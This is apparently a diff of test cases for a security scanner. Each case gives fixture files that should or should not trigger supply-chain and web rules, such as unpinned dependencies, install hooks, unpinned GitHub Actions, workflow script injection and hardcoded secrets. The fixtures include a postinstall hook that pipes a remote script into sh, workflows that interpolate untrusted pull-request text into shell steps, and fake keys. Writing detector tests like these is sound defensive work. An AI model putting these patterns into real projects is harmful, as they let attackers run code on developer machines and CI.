+   "rule": "SEC-SC-001",
+   "kind": "positive",
+   "note": "npm manifest without any lockfile",
+   "files": {
+    "package.json": "{\n  \"name\": \"a\",\n  \"dependencies\": {\"left-pad\": \"1.3.0\"}\n}\n"
+   },
+   "expect": [
+    [
+     "package.json",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc001-pos-poetry-and-pipfile",
+   "rule": "SEC-SC-001",
+   "kind": "positive",
+   "note": "poetry / Pipfile without locks",
+   "files": {
+    "pyproject.toml": "[tool.poetry]\nname='x'\n",
+    "svc/Pipfile": "[packages]\nrequests='*'\n"
+   },
+   "expect": [
+    [
+     "pyproject.toml",
+     1
+    ],
+    [
+     "svc/Pipfile",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc001-pos-cargo-bin-and-gemfile",
+   "rule": "SEC-SC-001",
+   "kind": "positive",
+   "note": "binary crate and application Gemfile without locks",
+   "files": {
+    "Cargo.toml": "[package]\nname='x'\n[[bin]]\nname='x'\n",
+    "Gemfile": "source 'https://rubygems.org'\ngem 'rails'\n"
+   },
+   "expect": [
+    [
+     "Cargo.toml",
+     1
+    ],
+    [
+     "Gemfile",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc001-pos-nested-package-lock-only-elsewhere",
+   "rule": "SEC-SC-001",
+   "kind": "positive",
+   "note": "lockfile in a sibling directory does not cover another package",
+   "files": {
+    "app/package.json": "{\n  \"name\": \"a\",\n  \"dependencies\": {\"left-pad\": \"1.3.0\"}\n}\n",
+    "other/package-lock.json": "{}"
+   },
+   "expect": [
+    [
+     "app/package.json",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc002-neg-pinned-requirements",
+   "rule": "SEC-SC-002",
+   "kind": "negative",
+   "note": "exact pins, hashes, markers, options and local editable",
+   "files": {
+    "requirements.txt": "# deps\nrequests==2.31.0\nflask==3.0.0 ; python_version >= '3.9'\n-r base.txt\n--index-url https://pypi.org/simple\n-e .\n-e ./libs/core\nnumpy==1.26.4 \\\n    --hash=sha256:abc\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc002-neg-pinned-npm",
+   "rule": "SEC-SC-002",
+   "kind": "negative",
+   "note": "semver ranges and pinned git refs",
+   "files": {
+    "package.json": "{\n  \"dependencies\": {\n    \"a\": \"1.2.3\",\n    \"b\": \"^2.0.0\",\n    \"c\": \"~3.1.0\",\n    \"d\": \"github:user/repo#v1.2.3\",\n    \"e\": \"file:../local\",\n    \"f\": \"workspace:^\"\n  }\n}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc002-neg-url-and-at-requirement",
+   "rule": "SEC-SC-002",
+   "kind": "negative",
+   "note": "direct URL pins handled by SC-008, pinned VCS commit",
+   "files": {
+    "requirements.txt": "pkg @ https://files.example.com/pkg-1.0.tar.gz\ngit+https://github.com/o/r.git@0123456789abcdef0123456789abcdef01234567#egg=r\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc002-neg-comments-only-and-other-file",
+   "rule": "SEC-SC-002",
+   "kind": "negative",
+   "note": "comments with ranges; non-requirements text file",
+   "files": {
+    "requirements.txt": "# requests>=2\nflask==3.0.0  # was flask>=1\n",
+    "notes.txt": "pytest>=7\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc002-neg-npm-sha-and-alias",
+   "rule": "SEC-SC-002",
+   "kind": "negative",
+   "note": "git sha pin and npm: alias",
+   "files": {
+    "package.json": "{\"devDependencies\": {\"x\": \"git+https://github.com/o/x.git#0123456789abcdef0123456789abcdef01234567\", \"y\": \"npm:z@1.0.0\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc002-pos-npm-wildcard-latest",
+   "rule": "SEC-SC-002",
+   "kind": "positive",
+   "note": "npm * / latest / dist-tag / open range",
+   "files": {
+    "package.json": "{\n  \"dependencies\": {\n    \"a\": \"*\",\n    \"b\": \"latest\",\n    \"c\": \"next\",\n    \"d\": \">=1.0.0\"\n  },\n  \"devDependencies\": {\n    \"e\": \"1.0.0\"\n  }\n}\n"
+   },
+   "expect": [
+    [
+     "package.json",
+     3
+    ],
+    [
+     "package.json",
+     4
+    ],
+    [
+     "package.json",
+     5
+    ],
+    [
+     "package.json",
+     6
+    ]
+   ]
+  },
+  {
+   "id": "sc002-pos-requirements-unpinned",
+   "rule": "SEC-SC-002",
+   "kind": "positive",
+   "note": "requirements ranges and bare names",
+   "files": {
+    "requirements.txt": "django>=3.2\nrequests\nflask~=2.0\nok==1.0.0\n"
+   },
+   "expect": [
+    [
+     "requirements.txt",
+     1
+    ],
+    [
+     "requirements.txt",
+     2
+    ],
+    [
+     "requirements.txt",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "sc002-pos-git-branch",
+   "rule": "SEC-SC-002",
+   "kind": "positive",
+   "note": "VCS requirements and npm git deps tracking a branch",
+   "files": {
+    "requirements.txt": "git+https://github.com/o/r.git@main#egg=r\n-e git+https://github.com/o/s.git#egg=s\n",
+    "package.json": "{\"dependencies\": {\"x\": \"github:user/repo\", \"y\": \"user/repo#main\"}}"
+   },
+   "expect": [
+    [
+     "requirements.txt",
+     1
+    ],
+    [
+     "requirements.txt",
+     2
+    ],
+    [
+     "package.json",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc002-pos-requirements-dev-file",
+   "rule": "SEC-SC-002",
+   "kind": "positive",
+   "note": "requirements-dev and constraints files are also checked",
+   "files": {
+    "requirements-dev.txt": "pytest>=7\n",
+    "constraints.txt": "urllib3<3\n"
+   },
+   "expect": [
+    [
+     "requirements-dev.txt",
+     1
+    ],
+    [
+     "constraints.txt",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc003-neg-safe-scripts",
+   "rule": "SEC-SC-003",
+   "kind": "negative",
+   "note": "build/test/prepare scripts only",
+   "files": {
+    "package.json": "{\"scripts\": {\"build\": \"tsc\", \"test\": \"jest\", \"prepare\": \"husky\", \"prepublishOnly\": \"npm test\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc003-neg-mentions-in-other-fields",
+   "rule": "SEC-SC-003",
+   "kind": "negative",
+   "note": "postinstall appears in description / script bodies, not as a hook key",
+   "files": {
+    "package.json": "{\"description\": \"has a postinstall script\", \"scripts\": {\"check\": \"node postinstall.js\", \"postinstall-check\": \"x\"}, \"config\": {\"postinstall\": \"1\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc003-neg-vendored",
+   "rule": "SEC-SC-003",
+   "kind": "negative",
+   "note": "dependency packages inside node_modules are out of scope",
+   "files": {
+    "node_modules/x/package.json": "{\"scripts\": {\"postinstall\": \"node x.js\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc003-neg-known-benign-hook",
+   "rule": "SEC-SC-003",
+   "kind": "negative",
+   "note": "well-known tool-only hooks",
+   "files": {
+    "package.json": "{\"scripts\": {\"postinstall\": \"patch-package\", \"preinstall\": \"husky install\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc003-neg-non-npm-manifest",
+   "rule": "SEC-SC-003",
+   "kind": "negative",
+   "note": "composer scripts / yaml are not npm lifecycle hooks",
+   "files": {
+    "composer.json": "{\"scripts\": {\"post-install-cmd\": \"x\", \"postinstall\": \"y\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc003-pos-postinstall-curl",
+   "rule": "SEC-SC-003",
+   "kind": "positive",
+   "note": "postinstall fetching remote script",
+   "files": {
+    "package.json": "{\n  \"name\": \"x\",\n  \"scripts\": {\n    \"postinstall\": \"curl -s https://x.io/i.sh | sh\"\n  }\n}\n"
+   },
+   "expect": [
+    [
+     "package.json",
+     4
+    ]
+   ]
+  },
+  {
+   "id": "sc003-pos-preinstall-and-install",
+   "rule": "SEC-SC-003",
+   "kind": "positive",
+   "note": "preinstall and install hooks on separate lines",
+   "files": {
+    "pkg/package.json": "{\n  \"scripts\": {\n    \"preinstall\": \"node pre.js\",\n    \"install\": \"node-gyp rebuild && node post.js\"\n  }\n}\n"
+   },
+   "expect": [
+    [
+     "pkg/package.json",
+     3
+    ],
+    [
+     "pkg/package.json",
+     4
+    ]
+   ]
+  },
+  {
+   "id": "sc003-pos-compact-json",
+   "rule": "SEC-SC-003",
+   "kind": "positive",
+   "note": "hook in a single-line manifest",
+   "files": {
+    "package.json": "{\"scripts\": {\"postinstall\": \"node setup.js\"}}"
+   },
+   "expect": [
+    [
+     "package.json",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc004-neg-sha-pinned",
+   "rule": "SEC-SC-004",
+   "kind": "negative",
+   "note": "actions pinned to full commit sha with version comment",
+   "files": {
+    ".github/workflows/ci.yml": "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v4.1.0\n      - uses: 'actions/setup-node@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc004-neg-local-action",
+   "rule": "SEC-SC-004",
+   "kind": "negative",
+   "note": "local composite action and local reusable workflow",
+   "files": {
+    ".github/workflows/ci.yml": "jobs:\n  b:\n    steps:\n      - uses: ./.github/actions/setup\n  c:\n    uses: ./.github/workflows/reuse.yml\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc004-neg-docker-digest",
+   "rule": "SEC-SC-004",
+   "kind": "negative",
+   "note": "docker action pinned by digest",
+   "files": {
+    ".github/workflows/ci.yml": "jobs:\n  b:\n    steps:\n      - uses: docker://alpine@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc004-neg-commented-and-run-text",
+   "rule": "SEC-SC-004",
+   "kind": "negative",
+   "note": "unpinned refs in comments and run bodies",
+   "files": {
+    ".github/workflows/ci.yml": "jobs:\n  b:\n    steps:\n      # - uses: actions/checkout@v4\n      - run: echo \"uses: actions/checkout@v4\"\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc004-neg-non-workflow-yaml",
+   "rule": "SEC-SC-004",
+   "kind": "negative",
+   "note": "yaml outside workflow dirs with uses: keys",
+   "files": {
+    "docs/example.yml": "- uses: actions/checkout@v4\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc004-pos-tag-pinned",
+   "rule": "SEC-SC-004",
+   "kind": "positive",
+   "note": "actions pinned to mutable tags/branches",
+   "files": {
+    ".github/workflows/ci.yml": "jobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@main\n      - uses: 'org/act/sub@v1'\n"
+   },
+   "expect": [
+    [
+     ".github/workflows/ci.yml",
+     4
+    ],
+    [
+     ".github/workflows/ci.yml",
+     5
+    ],
+    [
+     ".github/workflows/ci.yml",
+     6
+    ]
+   ]
+  },
+  {
+   "id": "sc004-pos-short-sha-and-docker-tag",
+   "rule": "SEC-SC-004",
+   "kind": "positive",
+   "note": "abbreviated sha and docker tag",
+   "files": {
+    ".github/workflows/ci.yml": "jobs:\n  b:\n    steps:\n      - uses: actions/checkout@a1b2c3d\n      - uses: docker://alpine:3.19\n"
+   },
+   "expect": [
+    [
+     ".github/workflows/ci.yml",
+     4
+    ],
+    [
+     ".github/workflows/ci.yml",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "sc004-pos-composite-action-yml",
+   "rule": "SEC-SC-004",
+   "kind": "positive",
+   "note": "composite action.yml using unpinned action",
+   "files": {
+    "tools/action.yml": "runs:\n  using: composite\n  steps:\n    - uses: actions/cache@v3\n      with: {path: x}\n"
+   },
+   "expect": [
+    [
+     "tools/action.yml",
+     4
+    ]
+   ]
+  },
+  {
+   "id": "sc005-neg-env-indirection",
+   "rule": "SEC-SC-005",
+   "kind": "negative",
+   "note": "untrusted data passed via env var, not interpolated in script",
+   "files": {
+    ".github/workflows/ci.yml": "name: ci\non: pull_request\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"$TITLE\"\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc005-neg-safe-contexts-in-run",
+   "rule": "SEC-SC-005",
+   "kind": "negative",
+   "note": "trusted contexts interpolated in run",
+   "files": {
+    ".github/workflows/ci.yml": "name: ci\non: pull_request\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo ${{ github.sha }} ${{ github.event.pull_request.number }}\n          echo ${{ github.run_id }}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc005-neg-prt-checkout-base",
+   "rule": "SEC-SC-005",
+   "kind": "negative",
+   "note": "pull_request_target checks out the base, not the PR head",
+   "files": {
+    ".github/workflows/p.yml": "on: pull_request_target\npermissions:\n  pull-requests: write\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc005-neg-job-level-permissions",
+   "rule": "SEC-SC-005",
+   "kind": "negative",
+   "note": "permissions declared per job",
+   "files": {
+    ".github/workflows/ci.yml": "on: push\njobs:\n  a:\n    permissions:\n      contents: read\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n  b:\n    permissions: {}\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc005-neg-if-condition-and-comment",
+   "rule": "SEC-SC-005",
+   "kind": "negative",
+   "note": "untrusted data in if: conditions and commented-out injection",
+   "files": {
+    ".github/workflows/ci.yml": "name: ci\non: pull_request\npermissions:\n  contents: read\njobs:\n  b:\n    if: contains(github.event.pull_request.title, 'wip')\n    runs-on: ubuntu-latest\n    steps:\n      # - run: echo ${{ github.event.issue.title }}\n      - run: echo ok\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc005-pos-title-in-run",
+   "rule": "SEC-SC-005",
+   "kind": "positive",
+   "note": "issue title interpolated into a one-line run",
+   "files": {
+    ".github/workflows/i.yml": "name: ci\non: pull_request\npermissions:\n  contents: read\non2: x\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"${{ github.event.issue.title }}\"\n"
+   },
+   "expect": [
+    [
+     ".github/workflows/i.yml",
+     10
+    ]
+   ]
+  },
+  {
+   "id": "sc005-pos-body-in-block-scalar",
+   "rule": "SEC-SC-005",
+   "kind": "positive",
+   "note": "comment body and head_ref in a multi-line run script",
+   "files": {
+    ".github/workflows/c.yml": "name: ci\non: pull_request\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo start\n          echo '${{ github.event.comment.body }}'\n          git checkout ${{ github.head_ref }}\n"
+   },
+   "expect": [
+    [
+     ".github/workflows/c.yml",
+     11
+    ],
+    [
+     ".github/workflows/c.yml",
+     12
+    ]
+   ]
+  },
+  {
+   "id": "sc005-pos-prt-head-checkout",
+   "rule": "SEC-SC-005",
+   "kind": "positive",
+   "note": "pull_request_target workflow checking out PR head",
+   "files": {
+    ".github/workflows/p.yml": "on: pull_request_target\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
+   },
+   "expect": [
+    [
+     ".github/workflows/p.yml",
+     10
+    ]
+   ]
+  },
+  {
+   "id": "sc005-pos-missing-permissions",
+   "rule": "SEC-SC-005",
+   "kind": "positive",
+   "note": "job with no permissions and none at workflow level",
+   "files": {
+    ".github/workflows/ci.yml": "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n"
+   },
+   "expect": [
+    [
+     ".github/workflows/ci.yml",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "sc006-neg-placeholders",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "obvious placeholder values",
+   "files": {
+    "config.py": "API_KEY = 'changeme'\nPASSWORD = '<your-password>'\nSECRET = 'YOUR_SECRET_HERE'\napi_key = 'xxxxxxxxxxxx'\ntoken_secret = 'replace-me-please'\n",
+    ".env": "DB_PASSWORD=${DB_PASSWORD}\nAPI_KEY=<your-key>\nSECRET_KEY=changeme\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-env-references",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "values read from environment or secret stores",
+   "files": {
+    "a.py": "password = os.environ['DB_PASSWORD']\napi_key = os.getenv('API_KEY', 'default-key-12345')\n",
+    "b.js": "const apiKey = process.env.API_KEY;\nconst secret = process.env.SECRET || 'devsecret1234';\n",
+    "w.yml": "env:\n  TOKEN: ${{ secrets.NPM_TOKEN }}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-ui-strings-and-i18n",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "label/translation strings and hashed values",
+   "files": {
+    "i18n.json": "{\n  \"password_label\": \"Password confirmation\",\n  \"forgotPassword\": \"Forgot your password?\",\n  \"secret_hint\": \"Enter the secret code\"\n}\n",
+    "u.py": "password_hash = '$2b$12$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ012'\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-test-fixtures-and-docs",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "fake credentials in test paths, markdown, and *.example files",
+   "files": {
+    "tests/test_login.py": "password = 'Passw0rd!test'\napi_key = 'abcd1234efgh5678'\n",
+    "README.md": "export API_KEY=abcd1234efgh5678\n",
+    ".env.example": "API_KEY=abcd1234efgh5678\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-url-without-secret",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "urls with placeholder/short credentials, plain urls, lockfiles",
+   "files": {
+    "c.py": "DB = 'postgres://user:pass@localhost/db'\nU = 'https://user:${PASS}@host/x'\nV = 'https://example.com/a:b@c'\n",
+    "package-lock.json": "{\"integrity\": \"sha512-AbCdEfGh1234567890\", \"api_key\": \"abcd1234efgh5678\"}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-pos-aws-and-github-tokens",
+   "rule": "SEC-SC-006",
+   "kind": "positive",
+   "note": "provider-format keys in code",
+   "files": {
+    "cfg.py": "AWS = 'AKIAEXAMPLEEXAMPLE00'\nGH = 'ghp_EXAMPLEexample0EXAMPLEexample1EXAMPLE'\n"
+   },
+   "expect": [
+    [
+     "cfg.py",
+     1
+    ],
+    [
+     "cfg.py",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "sc006-pos-generic-assignments",
+   "rule": "SEC-SC-006",
+   "kind": "positive",
+   "note": "hardcoded passwords/api keys in py/js/yaml",
+   "files": {
+    "s.js": "const apiKey = 'a1b2c3d4e5f6g7h8';\nconst conn = { password: \"Sup3rS3cret!\" };\n",
+    "d.py": "DB_PASSWORD = 'hunter2hunter2'\n",
+    "k8s.yml": "data:\n  api_key: Zm9vYmFyYmF6MTIz\n"
+   },
+   "expect": [
+    [
+     "s.js",
+     1
+    ],
+    [
+     "s.js",
+     2
+    ],
+    [
+     "d.py",
+     1
+    ],
+    [
+     "k8s.yml",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "sc006-pos-private-key-and-url-creds",
+   "rule": "SEC-SC-006",
+   "kind": "positive",
+   "note": "PEM private key header and credentialed URL",
+   "files": {
+    "id.txt": "-----BEGIN RSA PRIVATE KEY-----\nRVhBTVBMRUVYQU1QTEVFWEFNUExFRVhBTVBMRUVYQU1QTEU=\n-----END RSA PRIVATE KEY-----\n",
+    "db.py": "URL = 'postgres://admin:S3cretPass99@db.internal/app'\n"
+   },
+   "expect": [
+    [
+     "id.txt",
+     1
+    ],
+    [
+     "db.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc006-pos-env-file-unquoted",
+   "rule": "SEC-SC-006",
+   "kind": "positive",
+   "note": ".env unquoted values and ini",
+   "files": {
+    ".env": "DB_PASSWORD=hunter2hunter2\nSTRIPE=sk_live_EXAMPLE0000EXAMPLE\n",
+    "aws.ini": "[default]\naws_secret_access_key = wJalrXUtnFEMIK7MDENGbPxRfiCYzzzzzzzzzzzz\n"
+   },
+   "expect": [
+    [
+     ".env",
+     1
+    ],
+    [
+     ".env",
+     2
+    ],
+    [
+     "aws.ini",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "sc008-neg-registry-and-local-specs",
+   "rule": "SEC-SC-008",
+   "kind": "negative",
+   "note": "registry versions, file/workspace/link and npm alias",
+   "files": {
+    "package.json": "{\"dependencies\": {\"a\": \"^1.0.0\", \"b\": \"file:../b\", \"c\": \"workspace:*\", \"d\": \"npm:x@1.0.0\", \"@s/p\": \"1.2.3\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc008-neg-pypi-https",
+   "rule": "SEC-SC-008",
+   "kind": "negative",
+   "note": "pip with https index and pinned names",
+   "files": {
+    "requirements.txt": "--index-url https://pypi.org/simple\n--extra-index-url=https://mirror.example.com/simple\nrequests==2.31.0\n-r other.txt\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc008-neg-comments-and-local-index",
+   "rule": "SEC-SC-008",
+   "kind": "negative",
+   "note": "URLs in comments and loopback http index",
+   "files": {
+    "requirements.txt": "requests==2.0  # see https://github.com/psf/requests\n# git+https://github.com/o/r.git\n--extra-index-url http://localhost:8080/simple\n-f http://127.0.0.1/wheels\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc008-neg-lock-https",
+   "rule": "SEC-SC-008",
+   "kind": "negative",
+   "note": "lockfiles resolved over https",
+   "files": {
+    "package-lock.json": "{\"packages\": {\"node_modules/a\": {\"resolved\": \"https://registry.npmjs.org/a/-/a-1.0.0.tgz\"}}}\n",
+    "yarn.lock": "a@^1:\n  resolved \"https://registry.yarnpkg.com/a/-/a-1.0.0.tgz\"\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc008-neg-vendored-manifest",
+   "rule": "SEC-SC-008",
+   "kind": "negative",
+   "note": "manifests inside node_modules",
+   "files": {
+    "node_modules/x/package.json": "{\"dependencies\": {\"y\": \"github:o/y\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc008-pos-npm-git-url",
+   "rule": "SEC-SC-008",
+   "kind": "positive",
+   "note": "npm deps from github shorthand, git+ and http tarball",
+   "files": {
+    "package.json": "{\n  \"dependencies\": {\n    \"a\": \"github:o/a\",\n    \"b\": \"git+https://github.com/o/b.git\",\n    \"c\": \"http://x.io/c.tgz\",\n    \"d\": \"o/d#main\"\n  }\n}\n"
+   },
+   "expect": [
+    [
+     "package.json",
+     3
+    ],
+    [
+     "package.json",
+     4
+    ],
+    [
+     "package.json",
+     5
+    ],
+    [
+     "package.json",
+     6
+    ]
+   ]
+  },
+  {
+   "id": "sc008-pos-pip-vcs-and-http-index",
+   "rule": "SEC-SC-008",
+   "kind": "positive",
+   "note": "pip VCS requirement, direct URL and http index",
+   "files": {
+    "requirements.txt": "git+https://github.com/o/r.git@v1#egg=r\n--extra-index-url http://pypi.corp.example/simple\npkg @ https://files.example.com/pkg.tar.gz\n"
+   },
+   "expect": [
+    [
+     "requirements.txt",
+     1
+    ],
+    [
+     "requirements.txt",
+     2
+    ],
+    [
+     "requirements.txt",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "sc008-pos-lock-http",
+   "rule": "SEC-SC-008",
+   "kind": "positive",
+   "note": "lockfile resolving over plain http (json and yarn)",
+   "files": {
+    "package-lock.json": "{\n  \"packages\": {\n    \"node_modules/a\": {\n      \"resolved\": \"http://registry.example.com/a-1.0.0.tgz\"\n    }\n  }\n}\n",
+    "yarn.lock": "a@^1:\n  resolved \"http://r.example.com/a.tgz\"\n"
+   },
+   "expect": [
+    [
+     "package-lock.json",
+     4
+    ],
+    [
+     "yarn.lock",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "sc008-pos-editable-vcs",
+   "rule": "SEC-SC-008",
+   "kind": "positive",
+   "note": "editable VCS install",
+   "files": {
+    "requirements.txt": "-e git+https://github.com/o/r.git#egg=r\n"
+   },
+   "expect": [
+    [
+     "requirements.txt",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web005-neg-exec-callback-concat",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "literal command; string concat only inside the callback, not the command",
+   "files": {
+    "g.js": "cp.exec('git --version', (err, stdout) => {\n  log('v' + stdout + '!');\n});\n",
+    "h.py": "os.system('git ' + 'status')\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-neg-ambient-declaration",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "TypeScript ambient declaration file",
+   "files": {
+    "lib.d.ts": "declare function eval(x: string): any;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-neg-constant-interpolation",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "uppercase constant interpolated into table name (not user input)",
+   "files": {
+    "s.js": "db.prepare(`DELETE FROM cache_v${VERSION} WHERE url = ?`).run(u);\n",
+    "t.py": "cur.execute(f\"SELECT COUNT(*) AS n FROM {TABLE_NAME}\")\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-neg-ternary-else-false",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "false is only the else-branch for a plain-http endpoint; reads option value",
+   "files": {
+    "o.js": "const o = { strictness: secure ? !!options.rejectUnauthorized : false };\nconst p = secure ? options.rejectUnauthorized : false;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web008-neg-minified-bundle",
+   "rule": "SEC-WEB-008",
+   "kind": "negative",
+   "note": "minified single-line bundle with token-like words and Math.random()",
+   "files": {
+    "bundle.js": "var a=1;xxxxxxxxxxxxxxxxxxxxtoken=Math.random();y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;y=1;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-neg-trusted-name",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "value named as trusted/safe html",
+   "files": {
+    "r.js": "el.innerHTML = trustedHtml;\nel.innerHTML = safeMarkup;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-camelcase-identifiers",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "identifier-like values that are not secrets",
